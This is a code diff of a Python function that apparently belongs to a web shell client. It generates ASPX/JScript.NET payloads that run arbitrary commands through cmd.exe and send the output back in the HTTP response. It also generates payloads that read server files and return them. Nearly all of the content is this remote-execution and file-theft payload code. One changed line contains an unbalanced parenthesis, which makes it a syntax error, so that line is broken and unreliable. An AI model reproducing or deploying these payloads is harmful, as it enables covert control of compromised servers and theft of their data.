@@ -139,27 +139,35 @@ def remote_command(language, cmd_type, mode, rsp_header, rsp_footer, command):
 
             if mode == "clear":
                 code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
-                    'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
-                    'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
-                    'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
-                    f'EI=e.StandardError;e.Close();Response.Write("{rsp_header}"+out.ReadToEnd()+EI.ReadToEnd()+"{rsp_footer}");'
+                'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
+                'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
+                'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
+                f'EI=e.StandardError;e.Close();Response.Write("{rsp_header}"+out.ReadToEnd()+EI.ReadToEnd()+"{rsp_footer}");'
 
 
             if mode == "base64_post":
-                code = """var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}")); var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("{}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{}");""".format(base64.b64encode(command),rsp_header,rsp_footer)
+                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
+                'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
+                'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
+                'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();'\
+                f'Response.Write("{rsp_header}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{rsp_footer}");'
 
             if mode == "base64_header":
-                code = """var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}")); var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("{}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{}");""".format(base64.b64encode(command),rsp_header,rsp_footer)
+                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{base64.b64encode(command)).decode()}"));'\
+                'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
+                'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
+                'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
+                f'EI=e.StandardError;e.Close();Response.Write("{rsp_header}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{rsp_footer}");'
 
         elif (cmd_type == "DOWNLOAD"):
             if mode == "clear":
-              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);Response.Write("{}");Response.BinaryWrite(buff);Response.Write("{}");}}""".format(base64.b64encode(command),rsp_header,rsp_footer)
+              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);Response.Write("{}");Response.BinaryWrite(buff);Response.Write("{}");}}""".format((base64.b64encode(command)).decode(),rsp_header,rsp_footer)
 
             if mode == "base64_post":
-              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);var s = Convert.ToBase64String(buff);Response.Write("{}");Response.Write(s);Response.Write("{}");}}""".format(base64.b64encode(command),rsp_header,rsp_footer)
+              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);var s = Convert.ToBase64String(buff);Response.Write("{}");Response.Write(s);Response.Write("{}");}}""".format((base64.b64encode(command)).decode(),rsp_header,rsp_footer)
 
             if mode == "base64_header":
-              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);var s = Convert.ToBase64String(buff);Response.Write("{}");Response.Write(s);Response.Write("{}");}}""".format(base64.b64encode(command),rsp_header,rsp_footer)
+              code = """var f=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));if (System.IO.File.Exists(f)){{var buff=System.IO.File.ReadAllBytes(f);var s = Convert.ToBase64String(buff);Response.Write("{}");Response.Write(s);Response.Write("{}");}}""".format((base64.b64encode(command)).decode(),rsp_header,rsp_footer)
 
     ########################
     # ASPX - End
